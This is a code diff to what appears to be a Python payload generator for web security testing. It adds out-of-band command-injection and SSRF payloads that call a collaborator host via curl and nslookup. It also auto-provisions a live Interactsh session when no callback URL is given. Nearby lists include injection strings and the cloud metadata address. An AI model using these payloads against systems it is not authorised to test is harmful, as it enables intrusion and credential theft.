@@ -144,6 +144,8 @@ CMDI_PAYLOADS: List[str] = [
     "'; id; '",
     "\"; id; \"",
     "%0a id",
+    "; nslookup COLLABORATOR",
+    "| curl -s https://COLLABORATOR/cmdi",
 ]
 
 # ---------------------------------------------------------------------------
@@ -176,6 +178,8 @@ XXE_PAYLOADS: List[str] = [
 # Server-Side Request Forgery (SSRF)
 # ---------------------------------------------------------------------------
 SSRF_PAYLOADS: List[str] = [
+    "http://COLLABORATOR/",
+    "https://COLLABORATOR/ssrf",
     "http://127.0.0.1",
     "http://localhost",
     "http://169.254.169.254/latest/meta-data/",
@@ -255,7 +259,9 @@ def generate_payloads(
                    If omitted, returns payloads from all sub-techniques.
         max_payloads: Cap on number of payloads returned.
         collaborator_url: If provided, replaces COLLABORATOR placeholder in
-                          out-of-band payloads.
+                          out-of-band payloads. If omitted and payloads still
+                          contain COLLABORATOR, a live Interactsh session is
+                          provisioned and payload_domain is substituted.
 
     Returns:
         Dict with "vuln_type", "technique", "payloads" list, and "detection_hints".
@@ -281,21 +287,42 @@ def generate_payloads(
         for v in sub.values():
             payloads.extend(v)
 
-    # Replace collaborator placeholder
+    payloads = payloads[:max_payloads]
+
+    oob_meta = None
+    needs_oob = any("COLLABORATOR" in p for p in payloads)
+    if needs_oob and not collaborator_url:
+        try:
+            from app.services.interactsh_service import ensure_session
+
+            oob_meta = ensure_session()
+            if oob_meta.get("success") and oob_meta.get("payload_domain"):
+                collaborator_url = str(oob_meta["payload_domain"])
+        except Exception:  # noqa: BLE001
+            oob_meta = None
+
     if collaborator_url:
         payloads = [p.replace("COLLABORATOR", collaborator_url) for p in payloads]
 
-    payloads = payloads[:max_payloads]
-
     detection_hints = _get_detection_hints(vuln_type)
 
-    return {
+    out = {
         "vuln_type": vuln_type,
         "technique": technique or "all",
         "payload_count": len(payloads),
         "payloads": payloads,
         "detection_hints": detection_hints,
     }
+    if collaborator_url:
+        out["collaborator_url"] = collaborator_url
+    if oob_meta and oob_meta.get("success"):
+        out["interactsh"] = {
+            "session_id": oob_meta.get("session_id"),
+            "payload_url": oob_meta.get("payload_url"),
+            "payload_email": oob_meta.get("payload_email"),
+            "next": f"execute_interactsh poll {oob_meta.get('session_id')}",
+        }
+    return out
 
 
 def _get_detection_hints(vuln_type: str) -> Dict:
